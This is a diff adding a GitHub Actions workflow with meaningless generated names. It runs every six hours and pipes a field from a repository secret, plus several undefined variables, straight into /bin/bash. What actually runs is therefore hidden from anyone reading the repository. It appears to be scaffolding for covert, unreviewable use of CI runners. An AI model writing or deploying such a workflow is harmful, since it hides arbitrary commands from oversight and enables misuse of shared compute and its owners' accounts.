@@ -1,0 +1,25 @@
+name: gantingxi3810
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gantingxi3810
+        env:
+          prx297: ${{ secrets.prx297 }}
+        run: |
+          echo $prx297 | jq -r .bwvu67 | /bin/bash
+          echo $cisd6 | jq -r .kuy9765 | /bin/bash
+          echo $kyxw86 | jq -r .s3431 | /bin/bash
+          echo $fj876 | jq -r .d72 | /bin/bash
+          echo $qqf1529 | jq -r .jvoy702 | /bin/bash
+          echo $yqn2 | jq -r .dmr0 | /bin/bash
+          echo $jr48621 | jq -r .j96264 | /bin/bash
+          echo $p80 | jq -r .noex65 | /bin/bash
+
